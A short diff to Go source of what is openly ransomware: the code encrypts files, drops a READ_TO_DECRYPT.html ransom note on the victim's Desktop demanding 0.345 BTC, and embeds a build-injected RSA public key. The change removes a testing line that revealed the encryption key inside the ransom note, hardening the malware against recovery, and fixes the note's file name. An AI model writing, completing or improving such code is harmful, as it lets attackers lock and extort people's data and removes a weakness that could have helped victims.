@@ -18,8 +18,10 @@ import (
 
 var (
 	// RSA Public key
-	// Automatically injected with make
-	PUB_KEY          = []byte(`INJECT_PUB_KEY_HERE`)
+	// Automatically injected on autobuild with make
+	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)
+
+	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
 )
 
@@ -144,18 +146,15 @@ func encryptFiles() {
 		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
 		FILES
 
-		# The enc key is inserted for testing
-		# ENCRYPTION KEY: %s
-
 		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
 		%s decrypt yourkeyhere
 		</pre>
 		`
-		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", keys["enckey"], os.Args[0]))
+		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", os.Args[0]))
 
 		// Write the READ_TO_DECRYPT on Desktop
 		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
-		log.Println("Done! Don't forget to read the READ_FOR_DECRYPT.html file on Desktop")
+		log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 	}
 }
